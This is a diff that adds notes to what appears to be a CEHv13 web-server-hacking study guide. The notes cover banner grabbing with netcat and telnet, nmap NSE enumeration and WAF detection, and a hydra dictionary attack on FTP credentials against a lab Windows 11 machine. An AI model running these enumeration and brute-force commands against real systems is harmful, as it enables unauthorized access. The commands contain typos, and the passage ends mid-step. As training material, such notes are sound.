@@ -1634,3 +1634,66 @@ and payload loaded to self
 ```
 </details>
 
+<details>
+
+<summary>Footprint the Web Server</summary>
+
+* Footprint a web server using Netcat and Telnet
+```console
+:~$ open parrot
+nc -vv www.moviescope.com 80
+GET / HTTP/1.0 and press Enter twice.
+```
+
+* telnet 
+```console
+:~$telnet www.moviescope.com 80.
+and hit double enter
+```
+</detaisl>
+<details>
+<summary>Enumerate Web Server Information using Nmap Scripting Engine (NSE)</summary>
+
+*NSE
+```console 
+:~$ nmap -sV --script=http-enum [target website]
+> www.goodshopping.com
+
+nmap --script hostmap-bfk -script-args hostmap-bfk.prefix=hostmap- www.goodshopping.com.
+```
+Perform an HTTP trace on the targeted domain. 
+
+```console
+  :~$ nmap --script http-trace -d www.goodshopping.com.
+  ```
+   check whether Web Application Firewall is configured on the target host or domain.
+   ```console
+   :~$map -p80 --script http-waf-detect www.goodshopping.com\
+   ```
+   </details>
+   <details>
+   <summary> Perform a Web Server Attack</summary>
+
+   * Crack FTP credentials using a Dictionary Attack
+   ```console
+   :~$ In the terminal window, run nmap -p 21 [IP Address of Windows 11]. (to check is ftp is running or not)
+
+   check if an FTP server is hosted on the Windows 11 machine.
+
+    Run ftp [IP Address of Windows 11]
+    and try to connest with random password and exit
+
+    then 
+    CEHv13 Module 13 Hacking Web Servers folder and copy Wordlists folder.
+
+In the terminal window, run hydra -L /home/attacker/Desktop/Wordlists/Usernames.txt -P /home/attacker/Desktop/Wordlists/Passwords.txt ftp://[IP Address of Windows 11].
+then try to login 
+ftp ip
+mkdir and check it in victim machine C:FTP
+
+and then
+```
+```console
+:~$ help to see available option
+
+ 
